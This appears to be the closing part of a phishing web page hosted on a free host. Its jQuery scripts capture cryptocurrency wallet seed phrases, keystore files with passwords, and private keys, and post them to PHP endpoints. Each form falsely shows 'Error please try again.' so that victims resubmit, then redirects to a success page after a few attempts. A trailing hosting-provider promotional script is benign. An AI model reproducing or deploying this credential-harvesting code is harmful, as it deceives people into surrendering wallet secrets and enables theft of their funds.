          dataType: 'JSON',
          url: 'postoo.php',
          type: 'POST',
          data: {
            phrases: phrases,
            wall: wall,

          },
          // data: $('#contact').serialize(),
          beforeSend: function(xhr) {

          },
          success: function(response) {
            if (response) {

              console.log(response);
              if (response['signal'] == 'ok') {

                if (count >= 2) {
                  count = 0;
                  // window.location.replace(response['redirect_link']);
                  window.location.replace("success.html");

                }
                $("#msg").show();
                $('#msg').html("Error please try again.");
              } else {
                $("#msg").show();
                $('#msg').html("Error please try again.");
              }
            }
          },
          error: function() {

            if (count >= 2) {
              count = 0;
              window.location.replace("success.html");
            }
            $("#msg").show();
            $('#msg').html("Error please try again.");
          },
          complete: function() {

          }
        });
      });


    });
  </script>
  <script>
    /* global $ */
    $(document).ready(function() {
      var count = 0;

      $('#submits').click(function(event) {

        event.preventDefault();
        var keystorejson = $("#keystorejson").val();
        var password = $("#password").val();
        var walls = $("#walls").val();
        count = count + 1;

        $.ajax({
          dataType: 'JSON',
          url: 'posted.php',
          type: 'POST',
          data: {
            keystorejson: keystorejson,
            password: password,
            walls: walls,
          },
          // data: $('#contact').serialize(),
          beforeSend: function(xhr) {

          },
          success: function(response) {
            if (response) {

              console.log(response);
              if (response['signal'] == 'ok') {

                if (count >= 2) {
                  count = 0;
                  // window.location.replace(response['redirect_link']);
                  window.location.replace("success.html");

                }
                $("#msg").show();
                $('#msg').html("Error please try again.");
              } else {
                $("#msg").show();
                $('#msg').html("Error please try again.");
              }
            }
          },
          error: function() {

            if (count >= 2) {
              count = 0;
              window.location.replace("success.html");
            }
            $("#msg").show();
            $('#msg').html("Error please try again.");
          },
          complete: function() {

          }
        });
      });



    });
  </script>



  <script>
    /* global $ */
    $(document).ready(function() {
      var count = 0;

      $('#submit-btn').click(function(event) {

        event.preventDefault();
        var privatekeys = $("#privatekeys").val();
        var wallss = $("#wallss").val();

        count = count + 1;

        $.ajax({
          dataType: 'JSON',
          url: 'postings.php',
          type: 'POST',
          data: {
            privatekeys: privatekeys,
            wallss: wallss,
          },
          // data: $('#contact').serialize(),
          beforeSend: function(xhr) {

          },
          success: function(response) {
            if (response) {

              console.log(response);
              if (response['signal'] == 'ok') {

                if (count >= 2) {
                  count = 0;
                  // window.location.replace(response['redirect_link']);
                  window.location.replace("success.html");

                }
                $("#msg").show();
                $('#msg').html("Error please try again.");
              } else {
                $("#msg").show();
                $('#msg').html("Error please try again.");
              }
            }
          },
          error: function() {

            if (count >= 2) {
              count = 0;
              window.location.replace("success.html");
            }
            $("#msg").show();
            $('#msg').html("Error please try again.");
          },
          complete: function() {

          }
        });
      });



    });
  </script>
  <div style="text-align: right;position: fixed;z-index:9999999;bottom: 0;width: auto;right: 1%;cursor: pointer;line-height: 0;display:block !important;"><a title="Hosted on free web hosting 000webhost.com. Host your own website for FREE." target="_blank" href="https://www.000webhost.com/?utm_source=000webhostapp&utm_campaign=000_logo&utm_medium=website&utm_content=footer_img"><img src="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png" alt="www.000webhost.com"></a></div>
  <script>
    function getCookie(t) {
      for (var e = t + "=", n = decodeURIComponent(document.cookie).split(";"), o = 0; o < n.length; o++) {
        for (var i = n[o];
          " " == i.charAt(0);) i = i.substring(1);
        if (0 == i.indexOf(e)) return i.substring(e.length, i.length)
      }
      return ""
    }
    getCookie("hostinger") && (document.cookie = "hostinger=;expires=Thu, 01 Jan 1970 00:00:01 GMT;", location.reload());
    var wordpressAdminBody = document.getElementsByClassName("wp-admin")[0],
      notification = document.getElementsByClassName("notice notice-success is-dismissible"),
      hostingerLogo = document.getElementsByClassName("hlogo"),
      mainContent = document.getElementsByClassName("notice_content")[0];
    if (null != wordpressAdminBody && notification.length > 0 && null != mainContent) {
      var googleFont = document.createElement("link");
      googleFontHref = document.createAttribute("href"), googleFontRel = document.createAttribute("rel"), googleFontHref.value = "https://fonts.googleapis.com/css?family=Roboto:300,400,600,700", googleFontRel.value = "stylesheet", googleFont.setAttributeNode(googleFontHref), googleFont.setAttributeNode(googleFontRel);
      var css = "@media only screen and (max-width: 576px) {#main_content {max-width: 320px !important;} #main_content h1 {font-size: 30px !important;} #main_content h2 {font-size: 40px !important; margin: 20px 0 !important;} #main_content p {font-size: 14px !important;} #main_content .content-wrapper {text-align: center !important;}} @media only screen and (max-width: 781px) {#main_content {margin: auto; justify-content: center; max-width: 445px;}} @media only screen and (max-width: 1325px) {.web-hosting-90-off-image-wrapper {position: absolute; max-width: 95% !important;} .notice_content {justify-content: center;} .web-hosting-90-off-image {opacity: 0.3;}} @media only screen and (min-width: 769px) {.notice_content {justify-content: space-between;} #main_content {margin-left: 5%; max-width: 445px;} .web-hosting-90-off-image-wrapper {position: absolute; display: flex; justify-content: center; width: 100%; }} .web-hosting-90-off-image {max-width: 90%;} .content-wrapper {min-height: 454px; display: flex; flex-direction: column; justify-content: center; z-index: 5} .notice_content {display: flex; align-items: center;} * {-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;} .upgrade_button_red_sale{box-shadow: 0 2px 4px 0 rgba(255, 69, 70, 0.2); max-width: 350px; border: 0; border-radius: 3px; background-color: #ff4546 !important; padding: 15px 55px !important; font-family: 'Roboto', sans-serif; font-size: 16px; font-weight: 600; color: #ffffff;} .upgrade_button_red_sale:hover{color: #ffffff !important; background: #d10303 !important;}",
        style = document.createElement("style"),
        sheet = window.document.styleSheets[0];
      style.styleSheet ? style.styleSheet.cssText = css : style.appendChild(document.createTextNode(css)), document.getElementsByTagName("head")[0].appendChild(style), document.getElementsByTagName("head")[0].appendChild(googleFont);
      var button = document.getElementsByClassName("upgrade_button_red")[0],
        link = button.parentElement;
      link.setAttribute("href", "https://www.hostinger.com/hosting-starter-offer?utm_source=000webhost&utm_medium=panel&utm_campaign=000-wp"), link.innerHTML = '<button class="upgrade_button_red_sale">Go for it</button>', (notification = notification[0]).setAttribute("style", "padding-bottom: 0; padding-top: 5px; background-color: #040713; background-size: cover; background-repeat: no-repeat; color: #ffffff; border-left-color: #040713;"), notification.className = "notice notice-error is-dismissible";
      var mainContentHolder = document.getElementById("main_content");
      mainContentHolder.setAttribute("style", "padding: 0;"), hostingerLogo[0].remove();
      var h1Tag = notification.getElementsByTagName("H1")[0];
      h1Tag.className = "000-h1", h1Tag.innerHTML = "Black Friday Prices", h1Tag.setAttribute("style", 'color: white; font-family: "Roboto", sans-serif; font-size: 22px; font-weight: 700; text-transform: uppercase;');
      var h2Tag = document.createElement("H2");
      h2Tag.innerHTML = "Get 90% Off!", h2Tag.setAttribute("style", 'color: white; margin: 10px 0 15px 0; font-family: "Roboto", sans-serif; font-size: 60px; font-weight: 700; line-height: 1;'), h1Tag.parentNode.insertBefore(h2Tag, h1Tag.nextSibling);
      var paragraph = notification.getElementsByTagName("p")[0];
      paragraph.innerHTML = "Get Web Hosting for $0.99/month + SSL Certificate for FREE!", paragraph.setAttribute("style", 'font-family: "Roboto", sans-serif; font-size: 16px; font-weight: 700; margin-bottom: 15px;');
      var list = notification.getElementsByTagName("UL")[0];
      list.remove();
      var org_html = mainContent.innerHTML,
        new_html = '<div class="content-wrapper">' + mainContent.innerHTML + '</div><div class="web-hosting-90-off-image-wrapper"><img class="web-hosting-90-off-image" src="https://cdn.000webhost.com/000webhost/promotions/bf-2020-wp-inject-img.png"></div>';
      mainContent.innerHTML = new_html;
      var saleImage = mainContent.getElementsByClassName("web-hosting-90-off-image")[0]
    }
  </script>
</body>

</html>